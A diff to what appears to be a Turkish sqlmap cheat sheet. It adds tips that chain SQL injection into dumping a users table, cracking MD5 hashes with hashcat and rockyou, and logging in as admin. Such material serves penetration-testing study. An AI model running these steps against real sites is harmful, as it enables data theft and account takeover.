@@ -49,6 +49,7 @@
               "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" --dbs",
               "description": "GET parametresini test et ve veritabanlarını listele",
               "output": "available databases [3]:\n[*] information_schema\n[*] mysql\n[*] web_app",
+              "tip": "Sonraki adım: listelenen DB isimlerinden birini seç (web_app gibi) → aşağıdaki --tables komutuyla tablolarını gör. information_schema ve mysql sistem DB'leridir, asıl hedef uygulama DB'si (web_app) dir.",
               "flags": [
                 { "flag": "-u URL", "description": "Hedef URL (parametre ile birlikte)" },
                 { "flag": "--dbs", "description": "Tüm veritabanlarını listele" }
@@ -58,6 +59,7 @@
               "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" -D web_app --tables",
               "description": "Belirtilen veritabanındaki tabloları listele",
               "output": "Database: web_app\n[3 tables]\n+----------+\n| users    |\n| products |\n| sessions |",
+              "tip": "Sonraki adım: 'users' tablosu en değerli hedef — kullanıcı adı ve hash içerir. Aşağıdaki --dump komutuyla içeriğini çek. 'sessions' tablosu da ilginç — aktif oturum token'ları olabilir.",
               "flags": [
                 { "flag": "-D DBNAME", "description": "Hedef veritabanı adı" },
                 { "flag": "--tables", "description": "Tabloları listele" }
@@ -67,7 +69,7 @@
               "command": "sqlmap -u \"http://hedef.com/page.php?id=1\" -D web_app -T users --dump",
               "description": "users tablosunun tüm verilerini çek",
               "output": "Database: web_app  Table: users\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| 2  | john     | 482c811da5d5b4bc6d497ffa98491e38 |",
-              "tip": "Hash'ler MD5 gibi görünüyor. hashcat veya john ile kırabilirsiniz.",
+              "tip": "Hash'ler MD5 gibi görünüyor (32 karakter). Sonraki adım → hash kır: hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt VEYA crackstation.net'e yapıştır. Kırılan şifreyle siteye admin olarak giriş dene!",
               "flags": [
                 { "flag": "-T TABLE", "description": "Hedef tablo" },
                 { "flag": "--dump", "description": "Tablo içeriğini çek" },
@@ -76,7 +78,8 @@
             },
             {
               "command": "sqlmap -u \"http://hedef.com/login\" --data=\"username=admin&password=test\" --method POST --dbs",
-              "description": "POST form verisiyle test",
+              "description": "POST form verisiyle test — giriş formu veya API endpoint'i",
+              "tip": "Sonraki adım: --dbs çıktısında DB ismi gördükten sonra aynı komutu --tables ve -D ile kullan. POST isteğinde hangi parametre zafiyetli olduğunu görmek için --forms bayrağını dene.",
               "flags": [
                 { "flag": "--data", "description": "POST body verisi" },
                 { "flag": "--method POST", "description": "HTTP metodu" }
